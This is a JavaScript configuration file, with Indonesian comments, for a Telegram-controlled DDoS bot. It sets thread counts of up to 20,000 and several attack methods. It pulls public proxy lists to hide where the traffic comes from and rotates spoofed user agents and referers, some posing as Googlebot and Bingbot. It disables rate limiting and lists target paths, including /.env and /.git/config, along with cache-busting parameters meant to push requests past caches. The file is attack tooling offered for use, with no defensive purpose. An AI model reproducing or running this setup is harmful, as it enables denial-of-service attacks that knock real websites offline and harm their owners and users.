
// ============================================
// 🔥 KONFIGURASI UTAMA DDOS BOT - JANGAN KOSONG!
// ============================================

require('dotenv').config();

module.exports = {
    // TELEGRAM BOT CONFIG
    telegram: {
        token: process.env.BOT_TOKEN || '7654321090:AAH_xxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
        adminId: parseInt(process.env.ADMIN_ID) || 1234567890
    },

    // ATTACK DEFAULT SETTINGS
    attack: {
        defaultThread: parseInt(process.env.DEFAULT_THREAD) || 5000,
        maxThread: parseInt(process.env.MAX_THREAD) || 20000,
        timeout: parseInt(process.env.ATTACK_TIMEOUT) || 300, // detik
        methods: ['http', 'socket', 'mixed', 'all'],
        defaultMethod: 'all'
    },

    // PROXY SETTINGS
    proxy: {
        useProxy: process.env.USE_PROXY === 'true' || true,
        proxyFile: process.env.PROXY_FILE || './proxy.txt',
        proxyProtocols: ['http', 'socks4', 'socks5'],
        defaultProtocol: 'http',
        proxySources: [
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
            'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt'
        ]
    },

    // CONNECTION SETTINGS
    connection: {
        timeout: 5000, // ms
        maxSockets: 100,
        keepAlive: true,
        maxFreeSockets: 10,
        freeSocketTimeout: 30000
    },

    // HEADERS DEFAULT
    headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    },

    // USER AGENTS (LENGKAP)
    userAgents: [
        // Windows
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        
        // macOS
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
        
        // iPhone
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        
        // Android
        'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
        
        // Linux
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
        
        // Bot crawlers
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'
    ],

    // REFERERS
    referers: [
        'https://www.google.com/',
        'https://www.google.co.id/',
        'https://www.bing.com/',
        'https://www.facebook.com/',
        'https://twitter.com/',
        'https://www.instagram.com/',
        'https://www.youtube.com/',
        'https://www.tiktok.com/',
        'https://id.search.yahoo.com/',
        'https://duckduckgo.com/',
        'https://www.linkedin.com/',
        'https://www.whatsapp.com/',
        'https://web.telegram.org/',
        'https://www.netflix.com/',
        'https://www.amazon.com/',
        'https://www.tokopedia.com/',
        'https://shopee.co.id/',
        'https://www.lazada.co.id/'
    ],

    // LOG SETTINGS
    logging: {
        saveLogs: process.env.SAVE_LOGS === 'true' || true,
        logDir: process.env.LOG_DIR || './logs',
        logLevel: process.env.LOG_LEVEL || 'info', // debug, info, warn, error
        maxLogSize: 100, // MB
        logFormat: 'json' // json atau text
    },

    // RATE LIMIT SETTINGS
    rateLimit: {
        enabled: false,
        maxRequestsPerSecond: 1000,
        maxRequestsPerMinute: 60000
    },

    // ADVANCED SETTINGS
    advanced: {
        dnsCache: true,
        dnsCacheTTL: 300000, // 5 menit
        socketPooling: true,
        maxRedirects: 5,
        followRedirect: true,
        decompress: true,
        validateStatus: false
    },

    // PATHS BUAT SERANGAN (BIAR VARIATIF)
    paths: [
        '/',
        '/index.html',
        '/index.php',
        '/wp-admin',
        '/wp-login.php',
        '/wp-content/',
        '/wp-includes/',
        '/api/',
        '/api/v1/',
        '/api/v2/',
        '/api/users',
        '/api/login',
        '/api/data',
        '/assets/',
        '/assets/css/',
        '/assets/js/',
        '/assets/img/',
        '/images/',
        '/img/',
        '/css/',
        '/js/',
        '/static/',
        '/public/',
        '/uploads/',
        '/download/',
        '/files/',
        '/backup/',
        '/admin/',
        '/administrator/',
        '/user/',
        '/users/',
        '/profile/',
        '/account/',
        '/login/',
        '/register/',
        '/signup/',
        '/signin/',
        '/logout/',
        '/dashboard/',
        '/home/',
        '/about/',
        '/contact/',
        '/blog/',
        '/news/',
        '/product/',
        '/products/',
        '/category/',
        '/categories/',
        '/cart/',
        '/checkout/',
        '/search/',
        '/sitemap.xml',
        '/robots.txt',
        '/.env',
        '/.git/',
        '/.git/config',
        '/.git/HEAD'
    ],

    // PARAMETER ACAK BUAT BYPASS CACHE
    cacheBusters: [
        'cache',
        'timestamp',
        't',
        'time',
        'nocache',
        'no-cache',
        'rand',
        'random',
        'r',
        'cb',
        '_',
        'ver',
        'version',
        'v',
        'id',
        'uid',
        'uuid'
    ]
};
